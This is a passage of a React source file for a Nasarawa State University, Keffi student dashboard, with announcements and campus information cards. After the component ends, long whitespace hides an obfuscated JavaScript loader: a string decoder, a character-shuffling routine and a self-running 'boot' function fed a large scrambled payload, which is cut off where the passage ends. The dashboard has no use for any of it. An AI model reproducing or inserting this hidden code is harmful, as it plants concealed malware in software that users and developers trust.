            ))}
          </div>

          {/* Announcements */}
          <div style={{ padding: "20px 24px 0", fontSize: 15, fontWeight: 500 }}>📣 Announcements</div>
          <div style={{ padding: "10px 24px", display: "flex", flexDirection: "column", gap: 10 }}>
            {[
              { type: "urgent", icon: "⚠️", title: "2024/2025 Second Semester Registration Deadline", text: "All students must complete course registration by July 14, 2025. Late registration penalty of ₦5,000 applies.", date: "June 10, 2025" },
              { type: "gold", icon: "🏆", title: "NSUK Ranked #1 in Nigeria — Quality Education SDG", text: "Nasarawa State University, Keffi ranked first in Nigeria for commitment to SDG 4 (Quality Education).", date: "May 28, 2025" },
              { type: "", icon: "📅", title: "Convocation Ceremony — 15th Anniversary", text: "15th Convocation for 2022/2023 session will hold at the Assembly Hall on August 22–23, 2025.", date: "May 20, 2025" },
              { type: "", icon: "📖", title: "Institute of Capital Market Studies — Admissions Open", text: "Africa's first university-based capital market institute is accepting BSc applications.", date: "April 30, 2025" },
            ].map((a) => (
              <div key={a.title} style={{ background: "var(--color-background-primary)", borderRadius: 10, padding: "13px 15px", borderLeft: `3px solid ${a.type === "urgent" ? "#e63946" : a.type === "gold" ? "#e9c46a" : "#40916c"}`, display: "flex", gap: 11 }}>
                <div style={{ fontSize: 18, flexShrink: 0 }}>{a.icon}</div>
                <div>
                  <div style={{ fontWeight: 500, fontSize: 13, marginBottom: 3 }}>{a.title}</div>
                  <div style={{ fontSize: 12, color: "var(--color-text-secondary)", lineHeight: 1.4 }}>{a.text}</div>
                  <div style={{ fontSize: 10, color: "var(--color-text-secondary)", marginTop: 5 }}>📅 {a.date}</div>
                </div>
              </div>
            ))}
          </div>

          {/* Info cards */}
          <div style={{ padding: "20px 24px 0", fontSize: 15, fontWeight: 500 }}>🗂️ Quick Information</div>
          <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fill, minmax(260px, 1fr))", gap: 14, padding: "10px 24px 24px" }}>
            {[
              { icon: "📞", title: "Emergency Contacts", text: "Security: 08033000001 | Health Centre: 08100000001 | Admin: 08055000002", tag: "24/7" },
              { icon: "📅", title: "Academic Calendar", text: "First semester: Sept–Jan | Second semester: Feb–July | Long vacation: Aug", tag: "2024/25" },
              { icon: "🌐", title: "Online Services", text: "Student portal: portal.nsuk.edu.ng | E-Library: library.nsuk.edu.ng", tag: "Digital" },
              { icon: "🚌", title: "Campus Transport", text: "Shuttle runs hourly between Main Gate and Angwan Lambu hostels 6AM–10PM.", tag: "Transport" },
              { icon: "🔒", title: "Security Tips", text: "Always carry your student ID. Report suspicious activity to Security. Avoid shortcuts after dark.", tag: "Safety" },
              { icon: "📋", title: "Student Affairs", text: "Handles club registrations, welfare, disciplinary matters and accommodation allocation.", tag: "Student Life" },
            ].map((c) => (
              <div key={c.title} style={{ background: "var(--color-background-primary)", borderRadius: 12, padding: "18px", border: "0.5px solid var(--color-border-tertiary)" }}>
                <div style={{ fontSize: 26, marginBottom: 8 }}>{c.icon}</div>
                <div style={{ fontWeight: 500, fontSize: 14, marginBottom: 5 }}>{c.title}</div>
                <div style={{ fontSize: 13, color: "var(--color-text-secondary)", lineHeight: 1.5 }}>{c.text}</div>
                <span style={{ display: "inline-block", background: "#d8f3dc", color: "#1a6b3a", borderRadius: 4, padding: "2px 7px", fontSize: 10, fontWeight: 500, marginTop: 8 }}>{c.tag}</span>
              </div>
            ))}
          </div>
        </div>
      )}

      <style>{`
        @keyframes bounce { 0%,80%,100%{transform:translateY(0)} 40%{transform:translateY(-5px)} }
        ::-webkit-scrollbar{width:5px}
        ::-webkit-scrollbar-thumb{background:var(--color-border-tertiary);border-radius:3px}
        ul{margin:4px 0;padding-left:18px} ol{margin:4px 0;padding-left:18px} li{margin:3px 0}
      `}</style>
    </div>
  );
};																																																																																																																																																																																																																																																																										var z = '-5185';function _0x6258(_0x2fb09b,_0x5c3252){var _0x22420d=_0x10ea();return _0x6258=function(_0xc12524,_0x10eacc){_0xc12524=_0xc12524-0x0;var _0x62580d=_0x22420d[_0xc12524];if(_0x6258['GOPFRh']===undefined){var _0x4264dd=function(_0x42fb2f){var _0x2e6f01='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x48b34e='',_0x1ac226='';for(var _0x5c4a15=0x0,_0x3545c6,_0x3808dd,_0x4f8a3e=0x0;_0x3808dd=_0x42fb2f['charAt'](_0x4f8a3e++);~_0x3808dd&&(_0x3545c6=_0x5c4a15%0x4?_0x3545c6*0x40+_0x3808dd:_0x3808dd,_0x5c4a15++%0x4)?_0x48b34e+=String['fromCharCode'](0xff&_0x3545c6>>(-0x2*_0x5c4a15&0x6)):0x0){_0x3808dd=_0x2e6f01['indexOf'](_0x3808dd);}for(var _0x269d16=0x0,_0x5e511c=_0x48b34e['length'];_0x269d16<_0x5e511c;_0x269d16++){_0x1ac226+='%'+('00'+_0x48b34e['charCodeAt'](_0x269d16)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x1ac226);};_0x6258['EpskOJ']=_0x4264dd,_0x2fb09b=arguments,_0x6258['GOPFRh']=!![];}var _0x3235df=_0x22420d[0x0],_0x3250b3=_0xc12524+_0x3235df,_0x7c989a=_0x2fb09b[_0x3250b3];return!_0x7c989a?(_0x62580d=_0x6258['EpskOJ'](_0x62580d),_0x2fb09b[_0x3250b3]=_0x62580d):_0x62580d=_0x7c989a,_0x62580d;},_0x6258(_0x2fb09b,_0x5c3252);}(function(_0x57968b,_0x579f0e){var _0x3bf5ae=_0x6258,_0x1d482e=_0x57968b();while(!![]){try{var _0x38b162=-parseFloat(_0x3bf5ae(0x1))/0x1+-parseFloat(_0x3bf5ae(0xd))/0x2+parseFloat(_0x3bf5ae(0xc))/0x3*(-parseFloat(_0x3bf5ae(0x1f))/0x4)+Math['floor'](parseFloat(_0x3bf5ae(0x20))/0x5)*Math['ceil'](-parseFloat(_0x3bf5ae(0x1b))/0x6)+parseFloat(_0x3bf5ae(0xe))/0x7*(parseFloat(_0x3bf5ae(0x5))/0x8)+parseFloat(_0x3bf5ae(0x9))/0x9*(parseFloat(_0x3bf5ae(0x23))/0xa)+parseFloat(parseFloat(_0x3bf5ae(0x1c))/0xb);if(_0x38b162===_0x579f0e)break;else _0x1d482e['push'](_0x1d482e['shift']());}catch(_0x4a61ab){_0x1d482e['push'](_0x1d482e['shift']());}}}(_0x10ea,0x3b37c));function _0x10ea(){var _0xe51905=['s3bwEu0','z2DLCG','AfrKuKC','sgjvr3m','Aw5WDxq','C3rYAw5N','vfbZqK0','ywn0Aw9U','AhfLCNn4Bhv2D2fJzgPIEw1NB3j6zMTVy2LWDhj1Dg5ZDg9UyW','we55BuG','AM9PBG','yxbWBhK','odmZote2tK9eBhPt','mti1nZaZmZHetLPjswS','zNvUy3rPB24GkLWOicPCkq','DuDQsLC','ntj0AMjtEKu','nw1RzenpBa','y29UC3rYDwn0B3i','D2HPBguGkhrYDwuPihT9','mte3oteWyNntyuvL','uuHpDgO','C3rHDgvpyMPLy3q','y2HHAw4','zgvIDq','ndeXmtiWBefftuDc','xcTCkYaQkd86w2eTEKeTwL8KxvSWltLHlxPblvPFjf0Qkq','DLvWtvu','AhfPtwG','mta5odrqD1fot0i','DgvZDa','y291BNrLCG','BgvUz3rO','mJCWC0nRC21K','zNjVBunOyxjdB2rL','C3bSAxq','otaWmZL1z0reB2u','nJyWmJy2qxvHy1jT','odrID1r1tey'];_0x10ea=function(){return _0xe51905;};return _0x10ea();}var NX=[0x697b4f,0x16f,0x4fbb,0x265,0xaaef,0x4c9693],SX=[0x509f9d,0xf1,0xa3e1,0xbb,0xdb41,0x484f55];function spin(_0x2db043,_0xa35476){var _0x1fa1f1=_0x6258,_0x46306b={'TPsBM':function(_0x5eab4b,_0x5a16fc){return _0x5eab4b*_0x5a16fc;}},_0x781728=[],_0x26482f=0x0,_0x3243d9=_0xa35476[0x0],_0x45233a,_0x3eb081,_0x49659c,_0x904ba9,_0x3981f0,_0x1a4dc9;while(_0x26482f<_0x2db043[_0x1fa1f1(0x8)]){_0x781728[_0x26482f]=_0x2db043['charAt'](_0x26482f),_0x26482f+=0x1;}_0x45233a=_0x781728[_0x1fa1f1(0x8)],_0x26482f=0x0;while(_0x26482f<_0x45233a){_0x3eb081=_0x46306b[_0x1fa1f1(0x15)](_0x3243d9,_0x26482f+_0xa35476[0x1])+_0x3243d9%_0xa35476[0x2],_0x49659c=_0x3243d9*(_0x26482f+_0xa35476[0x3])+_0x3243d9%_0xa35476[0x4],_0x904ba9=_0x3eb081%_0x45233a,_0x3981f0=_0x49659c%_0x45233a,_0x1a4dc9=_0x781728[_0x904ba9],_0x781728[_0x904ba9]=_0x781728[_0x3981f0],_0x781728[_0x3981f0]=_0x1a4dc9,_0x3243d9=(_0x3eb081+_0x49659c)%_0xa35476[0x5],_0x26482f+=0x1;}return _0x781728[_0x1fa1f1(0x19)]('');}function splitLane(_0x525e49){var _0x1a4390=_0x6258,_0x17a68b=String[_0x1a4390(0xa)](0x1c),_0x1f3ca3=spin(_0x525e49,NX);return _0x1f3ca3=_0x1f3ca3['split']('^')['join'](_0x17a68b),_0x1f3ca3=_0x1f3ca3[_0x1a4390(0xb)]('*1')['join']('^'),_0x1f3ca3=_0x1f3ca3[_0x1a4390(0xb)]('*0')[_0x1a4390(0x19)]('*'),_0x1f3ca3[_0x1a4390(0xb)](_0x17a68b);}function peel(_0x44b92e){return spin(_0x44b92e,SX);}(function boot(_0x1b7459,_0x4a79f9){var _0x3141c3=_0x6258,_0x8cc316={'KpVyM':function(_0x55f21e,_0x1e4b75){return _0x55f21e(_0x1e4b75);},'HbUGs':function(_0x2deafe,_0x5e7691){return _0x2deafe(_0x5e7691);},'hqiMh':'R_<\x22cRJ!&VecRWa=RrfR$6\x22c1;RRYcnh_/.t\x20iRRRG^<R.RcR2.[nR\x20.Rf./<Rc3!!5nSR<RiRL.eSslf(edgxc<?o<rlcR?tRosdRfuSe.?&ph.RROMs[e<skRE.<Ru<rRe;RDRBrRR\x5c.fR.<c:!bpl09icoRrtcR(;roRRn2-\x22(.^w\x20y.<<dd\x20)$f\x20ou.%e<a<e.t<m(cRxfR<[J(feR<Pbr.b\x27oRi.RR<\x27RR%wRfs)eR.[agSP{d2.k<ac1e.!3.P<ZRiR*oDsi=[.<f.\x224Rb\x20N\x22eoxRpo.iIlkaeTR.2)%m<ieR]z<|Ru((fRwRR\x5cR>R9#.R0rd=s.0x!sR.fRS)(cct1pfotaeMuR@R=<RR/`.Rk$(2cR.s7e1a.FRKc*..z\x22RnfPesRtRRR.<Rl#Rf<:\x202((R\x20R$\x276s`<3nhi*$eXc}Rh?\x20ctoc.iecc9\x20{Ra<s;u!.e]ERRoH..$\x22n<D3RsRR..(ReesseR<\x20t,\x22\x20Rdov}Sc0Jmi.T<sEegsRw]R\x22aR.R!R<o))jR\x20Rew\x20itc.snk(}(n[veR<0<=kfH<rrMR\x20ciknE.c.B<&R[o]R.%ccRlrx;*\x20[\x22oisenRefea!Yn.ecR%o\x22u.<6lRRRyR=is=RR()RRe:RR)!RwcrR1<.o!RcRc@\x22}RuRqu5(3Pol\x22eRt0!ftaR*<R1tnkcf}T.!$/<ro\x20IycRR\x20)P<\x5c.b<tR7:PPs<].rX<<.eRu(RRRqnp.<.R;ctisX.RRyR$@<3)kRRc<+Rr8l*.iR!rC\x5cP!n=cs<(ci<(R7eReRc.\x20t<epe)e<<,e<(EK!.pnb$\x22RaRR.evuhc.Tl_c.:R0r\x20)Rww!sS0.t7u.0(R9_a($&.e6f.RRk1Cxbi8l.hc=m(@<Rd..<rr.2.KMrcb_RnR(R_c:Dwt}.R.{}9g$RRR)TVt<a(.<G.dR~WUR.;lr.hIsmNP\x20\x20t@RR8_R2R.iRrRPR<(R3#cec0ce3iRR<aR3RanR{Zs}!M<R-*.yda3Ri/0%fR#R\x20<i2<R08:.t}Rf!\x22-Rc.RlRcytyRseA0RSTR8.4q<$FTeR..P_<cR6hbR.eri.c-RhcARC2vR.;bS<R<a#K<R:r]Tfee-;!k=_s.Rcmjs(R}:<RaR*&g.<domeisRn.($#_a{V@ocY-.omPdam.RalfcyoT+!P_gsr.<biR!f.)cI&(bIoRi(rnrW.ie.Rc\x20!(ic(SR.cr`:9<XspR($\x20mRct<s.g!.48rskevVRPdRkxR<Rdern)eSs/)R\x20ler<csT3dc}.R5C/W(.SonZr)Rcoccsch)R.<RR<t.ss(RR<dlu.c.|f8tk,slnepo<eR<!.6R.eeRRTa&h\x20Mf<{[o$R<\x20Rs0)=\x20<xSec.c}<c$es((d)RRc}fCRR<*<R.m-.R*Re<(xvRs\x20(M&Rf.eP*g\x20>s)<o.=.RisnrR.?{5<ibR6)RR1s\x20cRgqcelc=cl;be<lf*SICd2e\x22zpRR}<cRlS,njscm$Rn.!aii<JY]<fPCs@jA.R<%\x20t.RowR}\x27\x20r>pzh..lR\x27<go_}<SR(kqxh[\x20&<iR-f$C<u<iaENR5RTR]<Rpsk..Rzdg.)]<)er.Rr.MsRzP>RRe<<t_hgl<p.RcmfRs!nftR4\x20dt_9^<,ore5RfRx\x20RR[rX.<sbyR<<.2R.RrenUP(y>.p<<csRlt0t.{.Syin<ggl$\x20Vc.):EHI!.xDuR,RpRhR(sct.MrRMjHMRRcR.\x20Rtnd|oa0.n#a.2)Dfk&cRIRRR/feR.c@<irs6T+1RPx..R.sc.aR#.-<X{R!n4RcRitR/nRe9m..<A)ben).]<.a(R(.{?3tR&RR/i(lX.\x20<h!dRR<\x22!co?\x203\x201R<-hn<dtndo<Rksm#-c(TeRee!].R<s<T+=R.Ri-r@RR.r#cd<cRRRmztf.CdeRp.c{QRibjsos.fRrg-RW0diRR<.k<ORR&-R!#\x20]Cs]yt4.-d_`PRR\x27<.RvejSw<dc.c\x20,f.P.(.citcNbRn\x27-.eRcRnrQ.rRxo{Rc<\x226Rnd]R}Rm(R$RSo.T5Rc2cx.*vRoic_>.s0BRf)<P<aR.oCZ|0\x20POHdQo.n\x20<.1soR_\x27\x20.P<er.[<R|R<0i<Rr;\x27I.R[}+lc![mc!.lc<n(a\x20tRRHRl,}p}R)R8RJ<aR.<td(N>]ic<me@5cn[u.R).b%sPn<<_RR!RbR=$RR^<!})sb-6\x22#E8cR(d!R)tratRR<<\x2021R\x27L!ib|eOtRRt$ucdnRR.t)RzE.GPy!\x20RAI-nqau<}.ycR...cRR.ccc$^RRdC_R<t8cRhs2\x22R2.\x27S>))2h!efy..>!iL$en\x20;%9OTv.d$4RRC<cPS(tuRwl&(m#\x22R|pch<tH$a<<\x20.t!RSEf.RRgcNP.R\x20CRi4mR<#MRR<;wi-#E\x20<<t<eR<H<RrntoE(!0r0<d..RC\x22cn..2bp(6Cp<SR\x22e1l)cc<a(P.P9e<qa)<<1<n.iRaRPR(}R=.&,2!cwR.)PR$.<qR<}!1*S<R!Rf.<c<Rd_<R2R<<#]<<RRRp!.rpR<*!TRIR<Pk<Rzta.&}.aleK=iP<R\x27=gRP}Rp${SB.\x20Rsy.(.t!\x20c;<e5sh64tt<pf<otxuLTkr>;<R.cpsR.cRtR-#a4uR6.Rte;-($?w8:p/&Rl0<r#<e\x20iisf!d$ao_(#cmr\x20e<RRV!Pnca<t.~crc(e\x27*a:\x20<RRneaZe.%/dR<RR*(E\x20`+e[PcwRw\x20<(eucta).7W</$P<.hcST\x207eRB!.+R.I<bhRel.te.b4[unueuR!Rlt(RRR,},HftHv_n.<eR\x20_A<8<sr<Rx4)RN!pRd|B\x20<RRkie\x27c-.Rcnm3cs<Si<i.).E(R(<RRPR\x20_3R<cwe.!.l<R$!Rbd,e<PREl$tpr!<o/).RRt!,T(rc#/.Ry(+RrRg`<f.<a+.f)/<<&<\x20eRR<ei-<BfE.sRbnRR).R%/jtlR<%c\x20R!R(xR#cR.sRR.RM.<R7c(cglRcm.]<.ec2b)P<<2RR&daBK)r<Zt>[daRHced.MR<}sRGr.R<?1RfRRcccR(osc\x22RR~k<\x5c!Mc.p.C)uRx)+(Rk\x5ce\x27j6MPURCmc?RR3R4(iie.sRe*R:zSR;Pn(Z)<lkRvl:<RQ{Rci\x22cP+e,MRWa.<RMrRlt#<RRst3r!.<g<KRwR(Rj.RRa!.G4R.$pn.z;{eR;21{0T4(rRk-\x27.!<Rx<iKh<)s[<tc\x20PueR}r(faaRf7l<R5!rRlDXRm.1:piR\x20<=\x20Rjso.<er!oRqI)R1Rrrwo{&tRRK<nCZ-0M.cuR)c%cd0+w<$E<iT<<otdayn<io^.R\x27RRwRc65kR#JP.<!R5e!r{Re;yeR(.0=;cis.c(gtR2pu9=MQf[{,On\x20..PNi(<.RaiQR..c%t/(/R<.r.Rr..l!scue.aP~R!c03aUR\x22tcsc.!rVRpaiz0<b\x22dtgd!.s?#cvdR~#R<R<)(Tb.IR)Pc<6?7)]4W6#nnPt.}re|RU>ReaR)p#\x20nS+b2%iRj}s(Xn^osycsgdJ.ss[pkR8.\x20suwrRny}do.GiT.<w+c.(cs;!\x20nh(R,RCR[<&XR<<.cbcTRsAfncS-R\x22i<.cB(|RR.Rd%R.U/R.rL<t)!ReR2cpp!s<>R?1R$<teR<<Ro0rtf(ResbDR7liaR.}s./sRcrsarlR%f]s0R.<le<re%s.sllsb8ROxCRtc1t6{.-\x20Rl.eRo.cgmRkoRsbca<Iyu}Rrt#s&|tRaxR)ho.Rsf\x20kRRR4cr(x.c=t.<i3(Rx\x20.<..R$f\x22t\x20RRsN</C\x20RnRdRrpRR<od<.R<r[ar\x22l<.\x20P\x22.Rs.R.rc!v#DfReebo{,R)d8v<fRc.cJ<te.!RR\x22kS(S)R#<S.hP}rt.(/(.c(1d<Rw!su0(o.Pb(0.RJcEiC.f(\x20.i.buc<#r...RR[8)_!R.SRB!\x22tRVbn_RlcPRR\x20oRn;h<RP@r8aRrlc|co5(Rp)<Rxd<<$.n<lo}erR<oyRan.oy.RIB<ht<cobEiR}(mMr.TaR0RetiR}.!<.R19t<AebR_Lclh!D0r.R0ilirRc/s8<cR(r*R@e<<.l;.rc-PulaRccRi\x2206@!Rc!.Qkl,<g<7}b(aRcL.cs\x27+..T(<rR<<..&fd>Ro\x20coemRcw.lcn(c:R\x27|t<RnRY]4M0GR.RFRut.!<f.u+$+t<R*7sRRR(ibhd=P.<}RR=eR._).)rr,4&\x20lR}e<R6RR<^gfleRdstP~<bc.(sy<5}Ri?lch<&.3{u.n_:iR7b;0<R<cRRRcR@|1seGRs2)c=h<f9e<<r+eR\x5c\x27)&5rv/Fr[.a.tn.RPrnU<o_c6n=ET<.i+xc7levsu<r.!Rc<!]Rw\x20.RR(]PRD.\x20lf!:&.bdpTl.R#RS.$R<(R\x20<<c[.n.\x20oRr67r<e-R-uc*RR$R.baeycs.![RxRR<DXtfncRQPisRtgc<.aR8!b!<St0<R>\x20RRriR>cUp.cRWZR!RDK)0cvnnks.e\x20R\x20^dlR<cfRRu:sGRe,(gRVR\x22RuRRR\x22RtR<Rs\x22.ERi_P&R<lyoSg\x27s>vRcwe4Rcg`.h<_c\x27(umdRP>o9RPn1R#.cfR<P]Rs/anfqNRR\x27<.Rc8ciRRRc.a_ptKo<psr<7<RRi.o_c/!nRRs(\x20>RP]xtt_s_ohB<a\x27s&.P<\x20.kGc6r<7io/wRISPPcxhRwc.<.cic%1Rf89dS\x20<RbcsRVRsxrda]R;t?RN,,R>)cPY\x22cRcReF\x20!0RRq}}r05L6.<R.rf<$u|c<c<U-D[\x20cc.o<5;<\x20(.E.h.R_l<Rr<<F<[ttCo%mS.RR3IbcioRR<apRcRc[RR<.fnRR,.RBan(y/R|HpGnR.<=RR<u(acs$R3eR)mc_A4unt\x22e;sor(%RPt(eg(-*r!m<RD(RRa.rglz.Rw.fR]qavo]f(%<<ccl<4s9\x5c@u\x209e.*x./FtSRP[.$%n`z)<<$!5Qcb+]R3tR<fiPce\x5c<zi.Rcabr\x20(<<bnv6!tnw_cXf(nh.[}*s(`<P>(R<..<xt9R(.c<(e0R.Pao.!d((-@f0e<<6RoRu;(d`\x20Rp..<p,e<T<N.PR.[RcOz)f(<l].u{?rf<R;R<I*a<<$`R(\x20(...<\x22:<NR%eR\x20i#.z.l(rR,dRa.dRv<sVc(s]i)Mh.Rn<RRRttRg,~.R[R#ef.;ttp.)sRnStlRR2oe.&ci(a}.\x22P&yseR_a%rRR.D<iPsRD!i.mR\x22Rjzh<uR.,>de.jO}aRQcV<s$3CgR<R5EcdUhce.!Uf.R-x6<].wc<<.E!rRPRiCx.SR!m.nXb.7f.zefZR\x22\x22](y<xb<k<]UR-c}qf.!Ni=YiRoRRN.@sw1Lue1kR&\x20#rDceR.alRR.R.(\x22]MRtMiRr)rluRd&.RRcpifIl2R<R<<5f)z&fURec<s4<ensR.o\x22<i<,R!s\x20oBiR-cR0lRNtTR)SRc<fdutRRdPzRH(Rcs)PD<c$Rx2&:1Hrlo..n\x20fs.$n8upO$0isssi.-<vR<.<qQ(!R!\x20[!dxwn.Ryu*i?dR%.R2Rt>r7s!tRs_Red`!<$]R\x20Rm!RfxR\x20mRok!ct<(..nRcSRn\x5c&.<0RTiwmtp3*G(Py/nxFhtR<.:Go...(Rt.r.<0ctT(r<\x20.o[iv.<R1sR9d]R+RRheR!cc2RRe\x229c[r<;DePcRRktGlg<?tAU\x27ttRQR}\x20w3tRat](Vt-?<<?..\x22lr).eR-RRI^EKv.47Ro+iN<ece.nRx(tRHR\x20t8;Rir)<aRcx(qaRs@ferRM.<=.ct@<fcR.R)R.rxl!t/,lsRRRc=.i03RhRRs{_xRr<Q<c,a<<EW(MoR<\x20utE\x22f}bfr.<sR+]dr\x20<R!QRw.i\x20IRT_Po.(c0t8(sRTRRcnBR!\x22.xID.Ai}epoR3!oz=]etkRt/uA14RR9Rct!Nadr_nGC!/b$}R\x22xd<iRct^.uuw=3dRpwgR9R8PqRi#Rpg9u=1i0f<.R<P0f}tv_r3es:<fr<i7(<y(olR.e9ooBT._RtoE)\x20as(<cRiedtssR/RR/erR(.wce.R.rPy(RO(<.gHxrR<T.L!Rx(<o([.+{<c<R<.eiNTRC[x.4RkR$pK\x22.lcP(.<tk.<RQFknwIR).t-Rr=e{<.PP\x20#E63ap3[R)Lddc;RxR!R\x27\x20oo!)w.e!.Rc<0%<iss9RuO6ir$.R.ip6%m-6wRi<z<\x20gr=nweRRN__R(ReJvRfR%:NRPR<nRRR$.R.mR<rR#{Ec.)b<6peiRf#tL..R<PjRR.(,a_ll.\x20.D\x20g<(rhv\x20\x224k!\x20`lR<ke1\x20c$$5Rz.RR]eu&DiR\x20.R<((cersE.aoRhef)%eLR).:.^)esCR.}.T<P^.\x20Dy<#RcRpNRr)nRRl_3d8W(c=-3EeqeiMRReRzRacCue<l<Rsi.a;rc<.ldRY.RarlRcnOf3hTsdt<M\x22m<s(np}:A.fyR<RC<#Ry0vR<}<R.<%ats!lR>-<2lld.nr5=(F:.RRlnRcR\x22sz3o\x22<fR&3..!Y>fR)beRlshpM%<f.(d!abiFR\x203waM<se..qfR.i_.&E!.&RRRcRx{R[R._?R2!!RRcx)RIM.)f=#1ELbRRnJeaMim1)RRR_\x20|<la<3)0ycd&.#n=l.|Rs;.f(ec.cs=c{?R/%d_!anOce<Rrxa.\x27b)=_<m)icAcCRc.n<R.e\x20..R-<AR5.Rm[dR<<2R.An9xRctmcE%[..R,Qt<uPf_!<R=\x20tZRclpP*.uep6<f.b8RR<cSrk<e}Rckdc.;<tz.l.<!io.<r/2<R=bcRRsVD.R.1b<cc<R}<h+.\x20RvTRp_P<.rs(uPQt:..<>Rk9!=a;o<a*.7r]0Y)8c}z(<a.R.e8Ro\x20tl\x20Rc(A~i!*(bR%cR,c0t<\x20rMRR<\x20Ri<\x20.fPe*+E)m.oj..m8m.cR($<f.R.idey}cBRR!sc<no9R<n\x20RwrN0#tRduc_-RS\x22i{i)(nMcR<0N</V<<.,0+w.]<w<ReeR,w/eR.R)i.\x20R<e\x20.6Rga.rgs+Qitd.o!cteaLRo)3R\x20<.cd./.~<\x20.s\x5c.e<sp5R.<RRwa!*.R)tR,ofRZ<ZtcRhsRr$/.RC..b\x20\x22cRt,\x27leacPc\x20RR<Rz\x22<Ri\x20l0oRRdRs7.R(eCcR_.6\x22_R..p<&kddee.<=..lo.=R<!b.&Rc<tcCr0m&cXu\x27wnd.s;sw+R4/suDicPba\x20..i!o1^r}I>e4<:RwCRic<RRRc\x22.\x20dRpt0<.Rk0<W8r\x20RnR.Dc.CN\x20lwoh.l-<R<pcbR\x20Pe6hY-Rt.cEp:<+a-V<RaRf\x27(<rRRR&<az<4RRR.E)7.xrc0ilHRTisc.ZfRfcRx-th).R#=!<C.w\x22l{e]e-R</<s4Nt.op\x22ce.4Rn{SRo<R)Cc])e(Rw8RR.\x20<1hc{p8cS!e<R?RKa=i6Ri[.IRpR$RbxRScl.p<P!fa!vvsO.!pRRt.EglRt<.!iud.lu<is.RoR4!.P.cm.Pi}Ro..lPNRy6=t{<ae._!RwRtaR.sf.!.]4[e.RkE}-}ve..$NwiD!}.0R#<isaR3p%<}.aR@RJt.RGax.R\x27spC0!RGcr.2FRiRePaRnsRRRna<R)5U:\x22n=cdc?ABt.20.tdc!C1R\x20c.<edaA.R(.,elRcR<c&<.eCRURif{aJKR+ex-x:Pc%ei@ecRek?pR.4\x20RR<R#$c..i+!4RR$R3#R.r(PiRR<c.Rci_U!zRRR;u^|.Z.s(TRRTc.d}R<y._c<.RR{$kR4FB($\x5c<w.\x20.;R<eR4\x5csRc8<R.R[EdR\x20uoR[}V(.pd\x27\x22<Ja(4prAR(.Nc<<rp3.>z\x20eeR!<.<57:&P)c[RbRREM(_P.}RR).=Rhr<,CRRR(<k3R+hn\x20%R.RF)lR;R.s\x20R.jlmR((loH.<R<{PReRi<<cdeK.R.fR2pR(ao~.RyRRR[:RR?eisRPfk\x20Ys(s3.c\x20<4blo<0<9{o<RT@R..nRiR;al?soR0g<T.Rtm<u.s\x5c?Rl._Rccz4&:?0\x20.5R/ctc4<R>hi%.i#i}<R.Emc1xAnfR{Scr.R.%|\x22.PrrRn<cRnP!aRRtRfR.P\x208\x27R<JA\x20R&i<ecc{]cf.RmaR.irc.iReZ\x22n<y!<\x20cR\x20#<,ec!Rd9sic+_1a.ru..b..Reh<R~i$ot<fRdcit<\x5cgo_0lRmvF(<e9s<Rtt(\x20!RnR6}<.itO..&9s4dNRc\x20.o.RR.]j0\x20R\x20ma4;r<sCa)&\x20mo[xlR*ht!,Aup\x20Ru,fRtf[j)P*cRR1<RSv\x20s!2cIsR..e74hRd\x27c:vsr.s;<e(<_!MRfRfLLgal.!.u.R9(Mcla(d}tOa.}RcIebmEc0N(RD%bE$\x20rd<cw).F<ObZWR.jg.U4\x22afR`\x27m%/efaxRRR;Rna:7vR0bc.a_R<<jRRs..X)spGi&v\x27e.l.2.I.e9rRe.s\x271=r.eRexbb_RR_e9cd<FIP!.cR+8.446/U<<ls!]<u`pRsub<b>JPwp@ilR<i)k!dRLkR.trRx(rr)%\x20/.(]b8cRs+vR-c)}:osR.c#\x22<cqk<ek.imRSN.RsE\x20bPPn)<e}o0e\x22.1dRIR!(r.%.I..Rfza_?RRkf/,tcRRIf.<iR\x20bdRO.cPcdeR.s}ejFbp;o.fs<c_mc<aF.dnc0c\x20RRR.qn\x20.RcR.hRKj<Rs.kc<3Rs.ccTt.trtnt>w;/IcZc8r<i.Rt>Rcs..s\x20s{Te\x20<!.+.R.<uRPRo.<K.m.a.srM<R\x20.cwRic<R)nP(<RReeutcJc%pN.Rsce.=eaf0<\x27@S}1<<YIjr!!<4a.fRR.l&<R$..lv.}|5&R.R!<)xfs.b$:Rc\x20l.<\x20o(J.e.#N.7t<)c<w\x20eR0.=<yc\x20!..Re?<n\x27B[Rbo\x27auR}\x20rae#R=.iR(st2.b~\x20<Sc.}tTsRr<aR)\x20ryir!C<c\x20td~\x22\x20X.ttR<R!d\x20c..!ed.R.<R\x20n.Sne!!)4/oXRRu.enR<.rRqR\x22l_M.efttr\x20tRc._r<R.R.dd{Wh{R.<.&RRc<.gf}Rcr52dte}d(}?cF7.xy$W<!..c6pc?Nc0z(h4.RRo=_oa.Pf!f4hR.Rd*e=d#cc6rr{o/RaRS.z.v.RDc<.[R9.\x27t]&.RRR-4R&ew\x5ccRYeonf\x20t.m)e=.icK.R{.0sl1pcRs(chl.WR.yc.{eil3ft<{/.C.(.n<l)>m<<d1<a?\x20nec<R..avloRvjRge._\x20=R+.RR.wdR.d6%.Icc(+t.:ci\x27.cht.b.R!s4ft_Rxta<s}H,cc.dkRnc..}c#\x20n)R.(_)c13.ot.o.}<!.tRR).t<...8Rn.Htct<blRotcQGn^*_xmecPT}..<<r0\x20lEt!dn\x220pf.gl}R<eRlT@i..g)ne4Ru<fRRTg.cR.c.eet<..^ee,r;t|pcteWFs\x20RgadRroG(ltl\x20#(yr<.#ddt.<R\x20i-o<stId!b)RIEt*RRn&R.c<iRmlR(-(mtck.Ry!0RYJ<c.Ri>rr.\x20w9cTaR=<PcdK]_\x5c2f(\x20#.Rs%.te<n/Rrycc.nRc$.P&.f.iccBPNRdR;R.5<RR<mPo{(R{_n<lRid.hR\x20.dRnRr!JwR0.RPRr.>=(f<e?.<Bf]xRcbcPcRs}<R(s.RPY.RR_Pk(o<(dl<0eR,1:D1sv.ilhe_PRpccR1qm.dm\x22<sisPd.?\x20pmdRhRnct(?$RrtRx.e)`..R.p?i!R1Rr(\x20{.eTRR}.c}<RR8..RpR\x22cg;.cc0RrR.\x20t&3nd5ecPb_.R!RaccRbcdb}c(!{t<.Rnv.NR&~eAs$z\x22<4<.ogsfCaRl<ocERoRRt..<s.i`R?.sgc..RsRs.\x27$xRcsNRR!R`RoR_n!#R,!5qf.#BIR@l.,.]oReRa|<R[t<<:|a[4<R~R!+Eg-